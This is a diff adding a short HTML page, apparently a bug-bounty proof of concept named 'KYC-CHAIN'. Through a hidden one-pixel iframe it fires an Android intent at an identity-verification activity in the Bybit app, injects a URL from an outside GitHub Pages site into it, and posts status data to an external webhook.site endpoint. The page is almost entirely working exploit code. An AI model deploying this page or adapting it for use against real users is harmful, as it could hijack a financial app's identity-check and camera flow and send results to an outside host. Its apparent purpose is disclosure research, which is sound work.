@@ -1,0 +1,11 @@
+<!doctype html><html><body style="font:16px monospace;padding:10px"><h3>KYC-CHAIN</h3><pre id="o">arming</pre>
+<iframe id="f" style="width:1px;height:1px"></iframe>
+<script>
+var HOOK='https://webhook.site/2a05b999-357c-43f7-a6a2-4bc8cf26f376';
+function log(s){document.getElementById('o').textContent+='\n'+s}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d||{})})}catch(e){}}
+var inner='https://createnewdemo.github.io/bbprobe/cam2.html?token=t%26signatureId=s';
+var intent='intent://#Intent;action=android.intent.action.VIEW;component=com.bybit.app%2Faai.liveness.web.SolutionActivity;S.url='+encodeURIComponent(inner)+';end';
+log('firing intent → SolutionActivity'); post('KYC_ARMED',{intent:intent});
+document.getElementById('f').src=intent;
+</script></body></html>
